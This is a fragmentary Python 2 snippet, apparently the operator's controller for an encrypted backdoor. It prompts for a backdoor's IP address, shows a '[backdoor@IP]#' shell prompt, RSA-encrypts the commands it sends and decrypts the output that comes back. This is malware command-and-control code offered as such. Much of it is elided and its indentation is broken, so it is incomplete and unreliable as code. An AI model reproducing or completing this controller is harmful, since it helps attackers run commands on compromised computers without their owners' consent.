...
backdoorPublicKey = ''
def pingBackdoor():
    targetIP = raw_input('Enter IP address of backdoor: ')
...
def getCommands(clientSocket, publicKey, commandProcessed, printOutputLock):
    ...
    while getCommand:
        with printOutputLock:
            command = ''
            while not command:
                command = raw_input('[backdoor@%s]# ' % clientSocket.getpeername()[0])
        ciphertext = publicKey.encrypt(command, 32)[0]
                ...
                while True:
                    ...
                    if len(buffer) == 0:
                        ...
                        for chunk in encryptedData:
                            decryptedData += keypair.decrypt(chunk)
